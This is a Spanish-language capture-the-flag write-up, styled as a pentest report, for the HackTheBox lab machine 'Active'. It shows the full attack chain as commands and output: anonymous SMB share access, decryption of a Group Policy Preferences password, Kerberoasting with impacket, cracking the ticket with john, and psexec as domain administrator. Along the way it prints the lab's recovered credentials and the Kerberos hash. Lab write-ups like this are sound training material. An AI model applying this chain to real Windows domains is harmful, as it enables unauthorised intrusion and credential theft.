---
description: https://app.hackthebox.com/machines/Active
---

# Active

### 1. Executive Summary

Este informe detalla la explotación de la máquina **Active** de **HackTheBox**. Demostrando una cadena de ataque (**attack chain**), comenzando desde la enumeración inicial del servicio SMB hasta la escalada de privilegios de Administrador. Vulnerabilidades explotadas incluyendo: SMB shares, Group Policy Preferences (GPP) password exposure, y Kerberoasting.

| Campo               | Detalle      |
| ------------------- | ------------ |
| Dirección IP        | 10.129.86.96 |
| Sistema operativo   | Windows      |
| Plataforma          | HackTheBox   |
| Fecha de evaluación | 19/10/2026   |

***

### 2. Recopilación de información

Durante la fase de enumeración se identificaron los siguientes servicios expuestos en el objetivo:

#### 2.1 Port Scanning

| Puerto    | Servicio      | Versión                                                                                     | Notas |
| --------- | ------------- | ------------------------------------------------------------------------------------------- | ----- |
| 53/tcp    | domain        | Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)                              |       |
| 88/tcp    | kerberos-sec  | Microsoft Windows Kerberos (server time: 2026-10-19 10:28:25Z)                              |       |
| 135/tcp   | msrpc         | Microsoft Windows RPC                                                                       |       |
| 139/tcp   | netbios-ssn   | Microsoft Windows netbios-ssn                                                               |       |
| 389/tcp   | ldap          | Microsoft Windows Active Directory LDAP (Domain: active.htb; Site: Default-First-Site-Name) |       |
| 445/tcp   | microsoft-ds? |                                                                                             |       |
| 464/tcp   | kpasswd5?     |                                                                                             |       |
| 593/tcp   | ncacn\_http   | Microsoft Windows RPC over HTTP 1.0                                                         |       |
| 636/tcp   | tcpwrapped    |                                                                                             |       |
| 3268/tcp  | ldap          | Microsoft Windows Active Directory LDAP (Domain: active.htb; Site: Default-First-Site-Name) |       |
| 3269/tcp  | tcpwrapped    |                                                                                             |       |
| 5722/tcp  | msrpc         | Microsoft Windows RPC                                                                       |       |
| 9389/tcp  | mc-nmf        | .NET Message Framing                                                                        |       |
| 49152/tcp | msrpc         | Microsoft Windows RPC                                                                       |       |
| 49153/tcp | msrpc         | Microsoft Windows RPC                                                                       |       |
| 49154/tcp | msrpc         | Microsoft Windows RPC                                                                       |       |
| 49155/tcp | msrpc         | Microsoft Windows RPC                                                                       |       |
| 49157/tcp | ncacn\_http   | Microsoft Windows RPC over HTTP 1.0                                                         |       |
| 49158/tcp | msrpc         | Microsoft Windows RPC                                                                       |       |
| 49162/tcp | msrpc         | Microsoft Windows RPC                                                                       |       |
| 49166/tcp | msrpc         | Microsoft Windows RPC                                                                       |       |
| 49168/tcp | msrpc         | Microsoft Windows RPC                                                                       |       |

Comandos de enumeración empleados:

```bash
> nmap -sV 10.129.86.96 -p-
```

Hemos encontrado 22 puertos expuestos.

#### 2.2 SMB Enumeration

El **primer hallazgo** demostrado es que se nos permite **enumerar los recursos compartidos con Null Auth** (Sin autenticación)

```bash
> enum4linux -a 10.129.86.96
```

La enumeración nos revela los siguientes recursos compartidos\
Pasted image 20261020093053.png

#### 2.3 Anonymous SMB Access

El **segundo hallazgo** demostrado es que se nos permite **acceder al recurso compartido "Replication" sin autenticación**.

```bash
> smbclient '//10.129.86.96/Replication'             
Password for [WORKGROUP\fran]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sat Jul 21 12:37:44 2018
  ..                                  D        0  Sat Jul 21 12:37:44 2018
  active.htb                          D    
```

El **tercer hallazgo** demostrado es **CRITICO**. Localizamos el archivo **Groups.xml** que **contiene credenciales encriptados**.\
`smb:\active.htb\Policies\{31B2F340–016D-11D2–945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml`

```xml
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1
855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" chan
ged="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Pr
operties action="U" newName="" fullName="" description="" cpassword="edBSH
OwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw
/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" us
erName="active.htb\SVC_TGS"/></User>
</Groups>
```

**Credentials**:

* **User**: `SVC_TGS`
* **Encrypted Pass**: `edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ`

***

### 3. Explotación

#### 3.1 GPP Password Decryption

El **cuarto hallazgo**, tambien **CRITICO**. Es un fallo de seguridad histórico y crítico en entornos de **Active Directory (Windows)** que permite a cualquier usuario común de la red **obtener contraseñas de administrador en texto plano**

**Procedimiento de explotación:**

1. ```bash
   > gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
   GPPstillStandingStrong2k18
   ```

#### 3.2 Authenticated Access

El quinto hallazgo, también critico. Es que estas credenciales que hemos desencriptado, son válidas y nos permite el **Acceso Inicial**.

```bash
> nxc smb 10.129.86.129 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
SMB         10.129.86.129   445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.86.129   445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
SMB         10.129.86.129   445    DC               [*] Enumerated shares
SMB         10.129.86.129   445    DC               Share           Permissions     Remark
SMB         10.129.86.129   445    DC               -----           -----------     ------
SMB         10.129.86.129   445    DC               ADMIN$                          Remote Admin
SMB         10.129.86.129   445    DC               C$                              Default share
SMB         10.129.86.129   445    DC               IPC$                            Remote IPC
SMB         10.129.86.129   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.86.129   445    DC               Replication     READ            
SMB         10.129.86.129   445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.86.129   445    DC               Users           READ          
```

Se nos permite la lectura de: `NETLOGON`, `Replication` (_Que ya teniamos acceso sin autenticación_), `SYSVOL` y `Users`.

Descargamos la **primera flag** localizada en `Users/SVC_TGS/Desktop/user.txt`

```bash
> smbmap -H 10.129.86.129 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --download Users/SVC_TGS/Desktop/user.txt
[*] Detected 1 hosts serving SMB
[*] Established 1 SMB connections(s) and 1 authenticated session(s)
[+] Starting download: Users\SVC_TGS\Desktop\user.txt (34 bytes)
[+] File output to: /home/fran/Machines/HackTheBox/Easy/Active/crack/10.129.86.129-Users_SVC_TGS_Desktop_user.txt
[*] Closed 1 connections                                                   
```

**Evidencia — bandera de usuario (local.txt):**

Pasted image 20261020095427.png

***

### 4. Escalada de privilegios

#### 4.1 Kerberoasting

El **sexto hallazgo**, también **CRITICO**. Se ha identificado una **cuenta de servicio vulnerable a Kerberoasitng**.

```bash
> impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -request
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2026-10-19 16:47:13.724930             

[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$bffba11910e860f44f0bb3843e2b8ff3$13f3d1d377894504e5e531311ec16b81ad44db311e2f933d2d284a8780a853b08aa49d95cf1c0d04d9a8f9be25b2ff6f37effe827e4a5b563e8b4b11f7e9433fe17f59e3cc4c895115a866e2d88b9bb6bb6afc3cf48dbbddec5fe7db28202a7d30e9270e045b4c4bbfb58d60e598c38d037ee7b8b7b3acbab62e151ee0bf997f93ee0cbbfd5035a23de0048afc506ca5e5dfef0757f034ca6f84e0a93848618a61a8e64666f787a1b5aa403b473263b8ebf8385e023e29f1066fc805040e541492b773d66332071c14c021408c8d30e80123b2e3286555c85f7a6fb02a8ca0ccc90aac4b5de2324190c8fe825b63a266ad3a7581ef3bcdcdbe0f6360a2985e0cdba07c58f3a9ec1c22b49385f8e5a5033728bff72dfdca36447073bd512418eb9c8e7fb1d25f316d6815a1876e258c014a2196621c3b34eea77abf432150966f7cae380231fd8a08611064eed0859dca73bb881a70427affe98c5bc45f116ac8f28577e295ddfc61a712ca551b908ef40a3c855b9d6cdd34738b2f5a17273722a8fa3a0398c79aebd4915c884aa51b49e01a3cdf9620a28738d4ad56902e7fcd9353f0c3e47ff71a20a163b1714b1b34f44db667afaa97e71b0a031777d56817735e0bfa8764a151c2bf1c14d3cfa4cfd8fa4f130d2f0e11ec22d09190cd0f4e7a5e89f04ba47b1822d2b1a630c79ccba926859f7dc66b7b9cba51fb8ffad03525f2f47e810f0186d791c46c8468875366f2bc18646700070293fa56ac1764d1fa4519e9f2a819e7d247cbb43f76dc05a2ea922f46ba3432561a19d908c9ab2a067934049f756358542c8bc7714c32ce40f3bbc567b77ac529673a630c148c546f3a0b904978ca9edc8bd40b8357c9b912c206935d7f5e2f0a00fa82829cff0d343e453544b4852f2b5623451a5ca669c5c2f12a1bb70eab751117100e362302e42d5e2ec8018c3398b5e914dd6c1d6e2559f8e3b0525c65698be90028a20465955a9c49981f4c0488ac9f78e8f6bda324cd9dfcfdc45a82c5c3f3918777eb15f0c0145fffbf96f8504ec17a66384d23af59de094097127a5633537682221e416354afe213f7eaecf5c3476c6a5cfb07abc2e4430e5558dda2111655bdf4725e34d5a55d857060b35604413de5274c73489b1c328d2a223cae04e4fa5e275cedbdba894566055a07f3d6f3a1b180b2653e63430b4851adffcff2b1d806aff88e677aa67cb32745308b9eac96fed270f33045989430f9d24bd1be
```

Obtenemos el **hash de la contraseña del usuario Administrator** (Del grupo Domain Admins).

#### 4.2 Cracking del ticket Kerberos

El **séptimo hallazgo** descubierto es **crítico**. Recuperamos la contraseña asociada al ticket TGS con el diccionario `rockyou.txt`.

```bash
> john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Ticketmaster1968 (?)
```

**Contraseña desencriptada**: `Ticketmaster1968`

#### 4.3 Domain Access Admin

El **octavo y ultimo hallazgo** descubierto, es **CRITICO**. Este hallazgo es el que nos permite conseguir la **flag final**. Los credenciales que hemos extraido y crackeado posteriormente, son válidos para **autenticarnos como Administradores del Dominio**.

```bash
> impacket-psexec active.htb/Administrator:Ticketmaster1968@active.htb
```

<figure><img src="https://715045774-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F1y4jI1alIWxu1LgcFef6%2Fuploads%2FC3aFrxIxUzd2aweeaq0R%2FPasted%20image%2020261020101045.png?alt=media&#x26;token=43deb2a4-09fe-4ee5-9140-eae7d7b94837" alt=""><figcaption></figcaption></figure>

Lectura de **flag final** `C:\Users\Administrator\Desktop\root.txt`

<figure><img src="https://715045774-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F1y4jI1alIWxu1LgcFef6%2Fuploads%2Fy4BM2JZdI6oDXpTAonYy%2FPasted%20image%2020261020101333.png?alt=media&#x26;token=758d0a6a-c991-406b-afbf-7bf3650e8e56" alt=""><figcaption></figcaption></figure>
